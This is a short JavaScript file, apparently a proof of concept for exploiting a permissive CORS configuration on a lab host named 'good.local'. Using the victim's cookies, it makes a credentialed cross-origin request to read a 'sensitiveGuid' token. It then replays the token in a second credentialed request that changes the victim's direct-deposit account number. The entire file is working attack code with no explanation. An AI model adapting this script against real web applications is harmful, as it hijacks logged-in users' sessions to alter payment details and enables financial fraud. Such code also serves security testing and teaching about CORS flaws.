server='http://good.local';
function runXHR(){
	sessionStorage.removeItem("sensitiveGuid");
	getPrereq();
	//updateBilling();
}

function getPrereq(callback){
	var url = server + '/cors/prereq.php'
	var oReq = new XMLHttpRequest();
	
	oReq.onload = function () {
		if (oReq.readyState === oReq.DONE) {
        		if (oReq.status === 200) {
            			console.log(oReq.responseText);
				var sensitiveGuidArray = JSON.parse(oReq.responseText);
				
				sessionStorage.setItem("sensitiveGuid", sensitiveGuidArray['sensitiveGuid']);
				updateBilling();
			}
		}
	};
	params="{\"object\":\"1155\"}";
	oReq.open("POST", url);
	oReq.setRequestHeader("Content-type", "application/json");
	oReq.setRequestHeader("derpycustomheader", "randomvalue");
	oReq.withCredentials = true;
	oReq.responseType = "text";
	oReq.send(params);
}

function updateBilling(callback){
	var url = server + '/cors/sensitiveop.php'
	var oReq = new XMLHttpRequest();
	
	oReq.onload = function () {
		if (oReq.readyState === oReq.DONE) {
        		if (oReq.status === 200) {
            			console.log(oReq.responseText);
			}
		}
	};
	params="{\"object\":\"1155\",\"directdepositacct\":\"111111111\",\"stateGuid\":\"" + sessionStorage.getItem('sensitiveGuid') + "\"}";
	oReq.open("POST", url);
	oReq.setRequestHeader("Content-type", "application/json");
	oReq.withCredentials = true;
	oReq.responseType = "text";
	oReq.send(params);
}